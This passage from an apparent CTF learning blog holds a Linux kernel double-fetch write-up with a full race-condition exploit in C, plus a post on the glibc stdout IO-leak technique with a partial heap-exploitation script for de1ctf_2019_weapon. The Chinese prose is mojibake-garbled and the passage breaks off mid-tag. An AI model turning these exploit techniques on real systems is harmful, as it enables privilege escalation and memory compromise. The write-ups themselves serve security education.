title="æ¼æ´äº§ç”Ÿ"></a>æ¼æ´äº§ç”Ÿ</h4><p>æ­£å¸¸åˆ†æä»£ç çš„è¯ï¼Œç¡®å®æ‰¾ä¸åˆ°æ¼æ´ã€‚è¿™ä¸ªç¨‹åºå¸Œæœ›æˆ‘ä»¬æ‹¿ç”¨æˆ·æ€ç¨‹åºä¸­çš„ <code>flag</code> å’Œå†…æ ¸ä¸­ <code>flag</code> åšå¯¹æ¯”ï¼Œåªæœ‰å®Œå…¨ä¸€æ ·æ‰è¾“å‡º <code>flag</code>ï¼Œç¨‹åºä¸“é—¨æ£€æµ‹äº†ç”¨æˆ·æ€ç¨‹åºä¸­ <code>flag</code> çš„åœ°å€æ˜¯å¦ä½äºç”¨æˆ·åŒºå†…ã€‚ç°åœ¨çš„æƒ…å†µåšæˆå›¾ç‰‡ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png" alt="image-20230404102814465"></p><p>æˆ‘ä»¬ä¼ å…¥ <code>ioctl</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ <code>0x601100</code> ï¼ˆåœ°å€åªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼‰ä¹Ÿå°±æ˜¯ç»“æ„ä½“çš„åœ°å€ï¼Œç»“æ„ä½“ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡é’ˆ <code>ptr</code>ï¼Œåªæœ‰ <code>ptr</code> åœ¨ç”¨æˆ·åŒºå†…ï¼ˆä¹Ÿå°±æ˜¯ä¸º <code>flag in the user_space</code>ï¼‰æ‰èƒ½é€šè¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ï¼Œä¸è¿‡è¿™æ ·å°±æ²¡åŠæ³•é€šè¿‡ç¬¬äºŒä¸ªæ£€æŸ¥äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¯èƒ½ç¢°å·§åœ¨ç”¨æˆ·åŒºè‡ªå®šä¹‰çš„ <code>flag</code> å’Œå†…æ ¸ä¸­çš„ <code>flag</code> ä¸€æ ·ã€‚</p><p>å¯æ˜¯å¦‚æœæˆ‘ä»¬å¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ç¨‹åºé€šè¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥åï¼Œä¸æ–­å°† <code>ptr</code> æ”¹æˆ <code>flag in the kernel_space</code> ï¼ˆæå‰å°†å†…æ ¸ä¸­çš„ <code>flag</code> åœ°å€æ³„éœ²å‡ºæ¥ï¼‰ï¼Œè¿™æ ·åˆ°äº†ç¬¬äºŒä¸ªæ£€æŸ¥æ—¶ï¼Œç¨‹åºä¼šå°†å†…æ ¸ä¸­çš„ <code>flag</code> ä¸è‡ªå·±åšæ£€æŸ¥ï¼Œä»è€Œç»•è¿‡ç¬¬äºŒä¸ªæ£€æŸ¥ï¼Œè¾“å‡º <code>flag</code> ã€‚é—®é¢˜åœ¨äºæˆ‘ä»¬ä¸ç¡®å®šä»€ä¹ˆæ—¶å€™ç¨‹åºé€šè¿‡äº†ç¬¬ä¸€ä¸ªæ£€æŸ¥ï¼Œæ‰€ä»¥è¦å†™ä¸€ä¸ªå¾ªç¯ï¼Œä¸æ–­æ‰§è¡Œ <code>ioctl</code> ï¼ŒåŒæ—¶å¼€å¯çº¿ç¨‹ä¹Ÿä¸æ–­å¾ªç¯å»æ”¹å˜ <code>ptr</code> ï¼Œå½“ç¢°å·§ç¨‹åºé€šè¿‡äº†ç¬¬ä¸€ä¸ªæ£€æŸ¥æ—¶ï¼Œçº¿ç¨‹æ­£å¥½ä¹Ÿå°† <code>ptr</code> æ”¹å˜æˆäº† <code>flag in the kernel_space</code> ï¼Œæ­¤æ—¶å¾—åˆ° <code>flag</code> </p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -o exp -w -static -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> true_flag_address;</span><br><span class="line"><span class="type">int</span> over=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> *flag;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_flag</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> info *)a;</span><br><span class="line">    <span class="keyword">while</span> (over==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;flag = (<span class="type">char</span> *)true_flag_address;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;debug1 %d \n&quot;</span>,s-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> <span class="title">flag_info</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tt;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1-------&gt;%d\n&quot;</span>, fd1);</span><br><span class="line">    ioctl(fd1, <span class="number">0x6666</span>, <span class="number">0x0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; 1.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;1.txt&quot;</span>, O_RDWR);</span><br><span class="line">    lseek(fd2, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(fd2, buf, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="type">char</span> *index = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag address ------&gt; &quot;</span>);</span><br><span class="line">        write(<span class="number">1</span>, index, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    true_flag_address = strtoull(index, &amp;str, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nflag1 true_flag_adddress ----------&gt; %llx\n&quot;</span>, true_flag_address);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> false_flag[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    flag_info.length = <span class="number">33</span>;</span><br><span class="line">    flag_info.flag = false_flag;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tt, <span class="literal">NULL</span>, change_flag, &amp;flag_info);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd1, <span class="number">0x1337</span>, &amp;flag_info);</span><br><span class="line">        flag_info.flag = false_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    over = <span class="number">1</span>;</span><br><span class="line">    pthread_join(tt, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png" alt="image-20230404104852837"></p><h3 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h3><p>[<a href="https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8">åŸåˆ›]Linux Kernel Pwn_1_Double fetch-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) Linux kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (1)-Double Fetch_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-Double Fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºIO leakçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/a9dd00f0.html"/>
      <url>/posts/a9dd00f0.html</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸé’ˆå¯¹io leakè¿™ä¸ªæ‰‹æ³•ï¼Œè¿›è¡Œäº†å­¦ä¹ ï¼Œå¹¶åšäº†å‡ é“ç›¸å…³é¢˜ç›®ã€‚æ•´ç†äº†ä¸€ä¸‹ï¼Œå†™äº†è¿™ç¯‡æ–‡ç« ã€‚ä»¥åé‡åˆ°äº†æ–°çš„io leakçš„é¢˜ç›®ï¼Œå†æ›´æ–°ä¸Šæ¥ã€‚</p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><blockquote><p>å¤§è‡´åŸç†ï¼š</p><p>é€šè¿‡ç¯¡æ”¹_IO_2_1_stdout_ç»“æ„ä½“ä¸­çš„flagså­—æ®µå’Œ_IO_write_baseå­—æ®µï¼Œé€šè¿‡ç¯¡æ”¹flagså­—æ®µæ¥ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œé€šè¿‡ç¯¡æ”¹_IO_write_baseå­—æ®µä½¿å¾—ç³»ç»Ÿè°ƒç”¨writeæ‰“å°_IO_write_baseå­—æ®µä¸_IO_write_ptrå­—æ®µä¹‹é—´çš„å†…å®¹æ³„éœ²å‡ºlibcåœ°å€ã€‚</p><p>ä½¿ç”¨å‰æï¼š</p><p>1ã€ç¨‹åºæ²¡æœ‰showå‡½æ•°</p><p>2ã€å¼€å¯äº†FULL RELROä¿æŠ¤</p><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>1ã€æƒ³åŠæ³•å°†_IO_2_1_stdout_ç»“æ„ä½“ç”³è¯·å‡ºæ¥ã€‚</p><p>2ã€å¾€_IO_2_1_stdout_ç»“æ„ä½“å†™å…¥æ„é€ å¥½çš„æ•°æ®(å…·ä½“æ˜¯ä»€ä¹ˆä¸‹é¢ä¼šè¯´)ã€‚</p><p>3ã€æ‰§è¡Œä»»æ„ä¸€ä¸ªputså‡½æ•°ï¼Œå°±å¯ä»¥å°†libcåœ°å€æ³„éœ²å‡ºæ¥ã€‚</p></blockquote><h2 id="ç¬¬ä¸€æ­¥â€“ç”³è¯·"><a href="#ç¬¬ä¸€æ­¥â€“ç”³è¯·" class="headerlink" title="ç¬¬ä¸€æ­¥â€“ç”³è¯·"></a>ç¬¬ä¸€æ­¥â€“ç”³è¯·</h2><p>åœ¨ä¸åŒçš„libcç‰ˆæœ¬ï¼Œç”³è¯·æ—¶ä¹Ÿæœ‰ç•¥å¾®çš„åŒºåˆ«ã€‚</p><h3 id="ä¸åŒlibcç‰ˆæœ¬å¯¹äºstdoutç»“æ„ä½“çš„ç”³è¯·"><a href="#ä¸åŒlibcç‰ˆæœ¬å¯¹äºstdoutç»“æ„ä½“çš„ç”³è¯·" class="headerlink" title="ä¸åŒlibcç‰ˆæœ¬å¯¹äºstdoutç»“æ„ä½“çš„ç”³è¯·"></a>ä¸åŒlibcç‰ˆæœ¬å¯¹äºstdoutç»“æ„ä½“çš„ç”³è¯·</h3><p>å…ˆè¯´2.27å’Œ2.31è¿™ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå› ä¸ºåœ¨è¿™ä¸¤ä¸ªç‰ˆæœ¬æ—¶ï¼Œæ²¡æœ‰é’ˆå¯¹tcachebinçš„fdæŒ‡é’ˆè¿›è¡Œç›¸å…³ä¿æŠ¤ã€‚å°±å¯¼è‡´äº†tcache poisoningä¿®æ”¹å…¶fdæŒ‡é’ˆå°±å¯ä»¥ç›´æ¥å°†å †å—ç”³è¯·å‡ºæ¥ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦èƒ½æ§åˆ¶fdæŒ‡é’ˆï¼Œå°±å¯ä»¥ç›´æ¥å°†_IO_2_1_stdout_ç»“æ„ä½“(ä¹‹åç»Ÿç§°ä¸ºstdoutç»“æ„ä½“)ç”³è¯·å‡ºæ¥ã€‚</p><p>è€Œåœ¨2.23çš„libcç‰ˆæœ¬ä¸­ï¼Œä»fastbinä¸­ç”³è¯·å †å—æ˜¯å¯¹sizeä½è¿›è¡Œäº†æ£€æŸ¥ã€‚è€Œæˆ‘ä»¬èƒ½ä¼ªé€ sizeé€šè¿‡æ£€æŸ¥çš„åœ°å€åªæœ‰malloc_hook-0x23å’Œstdoutç»“æ„ä½“åœ°å€-0x43è¿™ä¸¤å¤„ã€‚ä¸è¿‡è¿˜å¥½æˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ä¼ªé€ sizeå°†stdoutç»“æ„ä½“ç”³è¯·å‡ºæ¥ã€‚å› æ­¤åªè¦èƒ½æ§åˆ¶fastbinä¸­çš„fdæŒ‡é’ˆï¼Œé—®é¢˜ä¾ç„¶ä¸å¤§ã€‚</p><p>PSï¼šä¸ºä»€ä¹ˆåªæœ‰2.23 2.27 2.31è¿™ä¸‰ä¸ªç‰ˆæœ¬çš„libcã€‚æ·¦ï¼Œå› ä¸ºç›®å‰åªç»ƒä¹ äº†è¿™ä¸‰ä¸ªç‰ˆæœ¬çš„io leakã€‚</p><h3 id="çˆ†ç ´ä¸€æ¯”ç‰¹ç”³è¯·stdoutç»“æ„ä½“"><a href="#çˆ†ç ´ä¸€æ¯”ç‰¹ç”³è¯·stdoutç»“æ„ä½“" class="headerlink" title="çˆ†ç ´ä¸€æ¯”ç‰¹ç”³è¯·stdoutç»“æ„ä½“"></a>çˆ†ç ´ä¸€æ¯”ç‰¹ç”³è¯·stdoutç»“æ„ä½“</h3><p>ä½†ä¸Šé¢è¿™ä¸¤ç§æƒ…å†µéƒ½æ²¡æœ‰è€ƒè™‘åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä½¿ç”¨io leakçš„æ—¶å€™ï¼Œè‚¯å®šæˆ‘ä»¬æ˜¯æ²¡æœ‰libcåœ°å€çš„ï¼Œé‚£æˆ‘ä»¬å°±æ— æ³•ç›´æ¥å°†tcachebinæˆ–è€…fastbinçš„fdæŒ‡é’ˆä¿®æ”¹ä¸ºstdoutç»“æ„ä½“åœ°å€ã€‚å¯¹æ­¤æˆ‘ä»¬é‡‡ç”¨çš„ç­–ç•¥æ˜¯åˆ©ç”¨unsorted binä¸­çš„fdæŒ‡é’ˆè¿›è¡Œåˆ©ç”¨ã€‚å› ä¸ºunsorted binä¸­çš„fdæŒ‡é’ˆæŒ‡å‘äº†çš„æ˜¯main arena+88æˆ–è€…main arena+96çš„ä½ç½®ï¼Œè¿™é‡Œä½äºlibcä¸­ã€‚å¦‚æœè¿™ä¸ªåœ°å€èƒ½å‡ºç°åœ¨fastbinæˆ–è€…tcachebinä¸­fdçš„ä½ç½®ï¼Œä¸”æˆ‘ä»¬å¯ä»¥å¯¹fdæŒ‡é’ˆè¿›è¡Œç¼–è¾‘ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å°†å…¶ä¿®æ”¹ä¸ºstdoutç»“æ„ä½“åœ°å€(stdoutç»“æ„ä½“åœ°å€çš„åä¸‰ä½æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯å€’æ•°ç¬¬å››ä½ä¼šå› ä¸ºASLRçš„åŸå› è€ŒéšæœºåŒ–ï¼Œå¯æˆ‘ä»¬åªèƒ½å†™å…¥ä¸¤å­—èŠ‚ï¼Œæ— æ³•å†™å…¥ä¸€ä¸ªåŠå­—èŠ‚ï¼Œå› æ­¤å€’æ•°ç¬¬å››ä½åªèƒ½é€šè¿‡çˆ†ç ´æ¥é¢„æµ‹)ã€‚</p><h3 id="å¦‚ä½•åœ¨fastbinæˆ–è€…tcachebinä¸­ç•™ä¸‹unsorted-binä¸­çš„fdæŒ‡é’ˆï¼Ÿå…·ä½“æƒ…å†µï¼Œå…·ä½“åˆ†æ"><a href="#å¦‚ä½•åœ¨fastbinæˆ–è€…tcachebinä¸­ç•™ä¸‹unsorted-binä¸­çš„fdæŒ‡é’ˆï¼Ÿå…·ä½“æƒ…å†µï¼Œå…·ä½“åˆ†æ" class="headerlink" title="å¦‚ä½•åœ¨fastbinæˆ–è€…tcachebinä¸­ç•™ä¸‹unsorted binä¸­çš„fdæŒ‡é’ˆï¼Ÿå…·ä½“æƒ…å†µï¼Œå…·ä½“åˆ†æ"></a>å¦‚ä½•åœ¨fastbinæˆ–è€…tcachebinä¸­ç•™ä¸‹unsorted binä¸­çš„fdæŒ‡é’ˆï¼Ÿå…·ä½“æƒ…å†µï¼Œå…·ä½“åˆ†æ</h3><p>è€Œå¦‚ä½•è®©unsorted binä¸­çš„fdæŒ‡é’ˆå‡ºç°åœ¨fastbinæˆ–è€…tcachebinä¸­çš„fdçš„ä½ç½®ï¼Œè¿™å°±å±äºå…«ä»™è¿‡æµ·å„æ˜¾ç¥é€šäº†ï¼Œä¸åŒé¢˜ç›®çš„æ€è·¯éƒ½ä¸ä¸€æ ·ã€‚è¿™é‡Œå°±å…·ä½“é¢˜ç›®å…·ä½“åˆ†æå§ã€‚</p><h2 id="ç¬¬äºŒæ­¥â€“ç¼–è¾‘"><a href="#ç¬¬äºŒæ­¥â€“ç¼–è¾‘" class="headerlink" title="ç¬¬äºŒæ­¥â€“ç¼–è¾‘"></a>ç¬¬äºŒæ­¥â€“ç¼–è¾‘</h2><p>å°†stdoutç»“æ„ä½“ç”³è¯·å‡ºæ¥åï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯å¯ä»¥å¾€é‡Œé¢å†™å…¥æ•°æ®çš„ã€‚</p><p>æˆ‘ä»¬éœ€è¦<strong>è¦†ç›–stdoutç»“æ„ä½“ä¸­çš„_flagså­—æ®µä¸º0xfbad1887ï¼Œå¹¶ä¸”è¦†ç›–_IO_read_ptrã€_IO_read_endã€_IO_read_baseè¿™ä¸‰ä¸ªæŒ‡é’ˆä¸º0ï¼Œæœ€åè¦†ç›–_IO_write_baseæŒ‡é’ˆçš„æœ€åä¸€å­—èŠ‚ä¸º00</strong>(è¿™é‡Œå¹¶ä¸æ˜¯éè¦ä¸º00ï¼Œå› ä¸ºåˆ°æ—¶å€™putså‡½æ•°ä¼šæ³„éœ²_IO_write_baseæŒ‡é’ˆä¸_IO_write_ptræŒ‡é’ˆä¹‹é—´çš„æ‰€æœ‰æ•°æ®ï¼Œåªè¦å°†_IO_write_baseæŒ‡é’ˆæ”¹çš„å°äº_IO_write_ptræŒ‡é’ˆå¹¶ä¸”ç¡®å®šè¿™äºŒè€…ä¹‹é—´å­˜åœ¨libcåœ°å€ï¼Œé‚£ä¹ˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œåªä¸è¿‡æˆ‘é€šå¸¸å°†å…¶è¦†ç›–ä¸º\x00)</p><p>è‡³äºä¸ºä»€ä¹ˆè¦å°†_flagså­—æ®µæ”¹ä¸º0xfbad1887è¿™ä¸ªå€¼ï¼Œæ˜¯å› ä¸ºè¿™ä¸ªå­—æ®µçš„å„ä¸ªæ¯”ç‰¹ä½éƒ½å±äºæ ‡å¿—ä½ï¼Œä¸åŒæ¯”ç‰¹ä½å­˜åœ¨çš„æ„ä¹‰ä¸åŒï¼Œèƒ½ç»•è¿‡çš„æ£€æŸ¥ä¹Ÿä¸åŒã€‚è€Œå°†_flagså­—æ®µæ”¹ä¸º0xfbad1887è¿™ä¸ªå€¼ï¼Œæ­£å¥½å¯ä»¥ç»•è¿‡é˜»æ­¢æˆ‘ä»¬å®Œæˆio leakçš„æ‰€æœ‰æ£€æŸ¥(å…·ä½“æ˜¯å“ªäº›æ£€æŸ¥åˆæˆ–è€…å¦‚ä½•ç»•è¿‡çš„ï¼Œå¯ä»¥å»ç½‘ä¸Šçœ‹ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„åšå®¢ï¼Œå½“æ—¶æ„Ÿè§‰å¸ˆå‚…ä»¬å†™çš„å¾ˆå…¨å¹¶ä¸”å¾ˆå¥½ï¼Œæˆ‘å°±æ²¡å†å»å•ç‹¬å†™äº†)ï¼Œç„¶åreadé‚£ä¸‰ä¸ªæŒ‡é’ˆï¼Œæˆ‘è¯•äº†ä¸€ä¸‹ï¼Œä»–ä»¬çš„å€¼æ— æ‰€è°“(ä¸ä¸€å®šéè¦å†™æˆ00)ã€‚</p><p>ç¼–è¾‘åstdoutç»“æ„ä½“å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220826111011178-1206554709.png"></p><h2 id="ç¬¬ä¸‰æ­¥â€“æ³„éœ²"><a href="#ç¬¬ä¸‰æ­¥â€“æ³„éœ²" class="headerlink" title="ç¬¬ä¸‰æ­¥â€“æ³„éœ²"></a>ç¬¬ä¸‰æ­¥â€“æ³„éœ²</h2><p>emmmï¼Œå‰ä¸¤æ­¥éƒ½å®Œæˆçš„è¯ï¼Œç¬¬ä¸‰æ­¥æ‰§è¡Œputså‡½æ•°æ—¶é¡ºå…¶è‡ªç„¶å°±æ³„éœ²äº†libcåœ°å€ï¼Œè¿™ä¸ªå°±æ²¡å•¥å¥½è¯´çš„äº†ã€‚</p><h1 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h1><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20220826111041719-1027187867.png"></p><h3 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="/../img/2706180-20220826111054199-1620326152.png"></p><p>deleteå‡½æ•°ä¸­å­˜åœ¨UAFæ¼æ´ã€‚</p><h3 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>åœ¨2.23çš„libcä¸­çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨UAFæ‰“ä¸€ä¸ªdouble freeã€‚åˆ©ç”¨editå‡½æ•°çš„è¯å†æ‰“ä¸€ä¸ªfastbin attackã€‚_IO_2_1_stdoutç»“æ„ä½“ä¸Šæ–¹å’Œ__malloc_hookä¸Šæ–¹éƒ½æœ‰ä¸€ä¸ª0x7f(è¿™ä¸ªå…·ä½“çš„è¦æ±‚å°±æ˜¯æœ‰ä¸€ä¸ª0x7få¼€å¤´çš„åœ°å€ï¼Œç„¶åè¯¥åœ°å€çš„ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒä¸ºNULL)ï¼Œå¯ä»¥å»åˆ©ç”¨fastbin attackä»è¿™é‡Œç”³è¯·å‡ºæ¥ä¸€ä¸ªfake chunkï¼Œæœ€ç»ˆå¯ä»¥æ³„éœ²libcåœ°å€æˆ–è€…åŠ«æŒhookè·å–shellã€‚</p><h4 id="ä¼ªé€ sizeï¼Œå°†chunké‡Šæ”¾åˆ°unsorted-binä¸­"><a href="#ä¼ªé€ sizeï¼Œå°†chunké‡Šæ”¾åˆ°unsorted-binä¸­" class="headerlink" title="ä¼ªé€ sizeï¼Œå°†chunké‡Šæ”¾åˆ°unsorted binä¸­"></a>ä¼ªé€ sizeï¼Œå°†chunké‡Šæ”¾åˆ°unsorted binä¸­</h4><p>ç”±äºè¿™é“é¢˜æ— æ³•ç”³è¯·è¶…è¿‡0x60çš„chunkï¼Œå› æ­¤æˆ‘ä»¬çš„æ­£å¸¸chunkè¢«é‡Šæ”¾æ‰æ— æ³•è¿›å…¥unsorted binä¸­ï¼Œæ‰€ä»¥éœ€è¦å…ˆæ‰“ä¸€ä¸ªfastbin attackå°†ä¸€ä¸ªfake_chunkç”³è¯·åˆ°æŸä¸ªå †å—çš„sizeä½ä¸Šæ–¹ï¼Œç„¶åé€šè¿‡editå‡½æ•°æ¥ç¯¡æ”¹å…¶sizeä½ã€‚æ”¾å…¥unsorted binä¸­çš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬æ— æ³•æ³„éœ²libcåœ°å€ï¼Œå› æ­¤æ— æ³•ç›´æ¥æ‹¿åˆ°_IO_2_1_stdoutç»“æ„ä½“çš„åœ°å€ï¼Œåªèƒ½åˆ©ç”¨unsorted binä¸­çš„fdæŒ‡é’ˆmain_arena+88è¿™ä¸ªlibcåœ°å€ï¼Œé€šè¿‡ç¯¡æ”¹å…¶åå››æ¯”ç‰¹ä½(æœ€åä¸‰ä½æ˜¯å›ºå®šçš„ï¼Œå€’æ•°ç¬¬å››ä½éœ€è¦çˆ†ç ´)æ¥è·å–_IO_2_1_stdoutç»“æ„ä½“ä¸Šæ–¹çš„åœ°å€ã€‚</p><p>è¿™éƒ¨åˆ†è„šæœ¬å¦‚ä¸‹:</p><p>å°±æ˜¯å…ˆæ‰“ä¸€ä¸ªfastbin attackï¼Œç„¶åç”³è¯·å‡ºæ¥fake chunkï¼Œç¯¡æ”¹ä¸€ä¸ªchunkçš„sizeå³å¯ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xB35</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å·²ç»ç¯¡æ”¹æˆåŠŸï¼š</p><p><img 